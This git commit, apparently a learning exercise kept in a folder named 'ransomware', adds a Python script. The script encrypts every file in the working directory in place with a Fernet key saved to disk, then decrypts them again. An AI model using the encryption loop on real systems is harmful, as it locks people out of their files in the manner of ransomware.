d1a8e96487227bb4983246b4492fb8fd6e74720b
Tushar <tushargarg0987@gmail.com>
2023-10-07 11:56:31 +0530

    Encryption decryption

---
+++ encrypt_decrypt_dir.py
@@ -0,0 +1,42 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+    if file == "encrypt.py" or file == "thekey.key":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+key = Fernet.generate_key()
+
+#encrytion
+
+with open("thekey.key","wb") as thekey:
+    thekey.write(key)
+
+with open("C:/Users/tusha/OneDrive/Desktop/ransomware/test.txt","rb") as thefile:
+    contents = thefile.read()
+contents_encrypted = Fernet(key).encrypt(contents)
+with open("C:/Users/tusha/OneDrive/Desktop/ransomware/test.txt","wb") as thefile:
+    thefile.write(contents_encrypted)
+
+for file in files:
+    with open(file, 'rb') as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, 'wb') as thefile:
+        thefile.write(contents_encrypted)
+
+# decryption
+
+with open("thekey.key","rb") as key:
+    secretkey = key.read()
+
+for file in files:
+    with open(file, 'rb') as thefile:
+        contents = thefile.read()
+    contents_decrypted = Fernet(secretkey).decrypt(contents)
+    with open(file, 'wb') as thefile:
+        thefile.write(contents_decrypted)
